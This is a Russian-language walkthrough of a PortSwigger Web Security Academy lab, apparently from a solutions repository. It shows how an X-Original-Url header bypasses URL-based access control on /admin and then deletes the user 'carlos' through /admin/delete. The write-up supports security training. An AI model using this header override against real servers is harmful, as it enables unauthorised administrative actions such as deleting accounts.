По заданию нам известно, что ресурс содержит директорию `/admin`. Попробуем зайти на нее, и проверить, открыта для она для общего доступа
```
https://0a33008704b9296e80736caf0012000e.web-security-academy.net/admin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/5.%20URL-based%20access%20control%20can%20be%20circumvented/pics%20for%20walktrough/1.png)
Попробуем обойти настройки ACL, используя параметр `X-ORIGINAL-URL : /admin`
```
GET / HTTP/2
...
X-Original-Url: /admin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/5.%20URL-based%20access%20control%20can%20be%20circumvented/pics%20for%20walktrough/2.png)

Видим, что мы обошли настройки ACL. Осталость удалить пользователя `carlos`. Откроем прошлый запрос в браузере, чтобы увидеть url для удаления пользователя `carlos`
```
https://0a33008704b9296e80736caf0012000e.web-security-academy.net/admin/delete?username=carlos
```
Изменим наш запрос на
```
GET /?username=carlos
...
X-Original-Url: /admin/delete

```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/5.%20URL-based%20access%20control%20can%20be%20circumvented/pics%20for%20walktrough/3.png)
Далее перейдем на корневую страницу, и увидим, что сервер обработал запрос, и удалил УЗ `carlos`
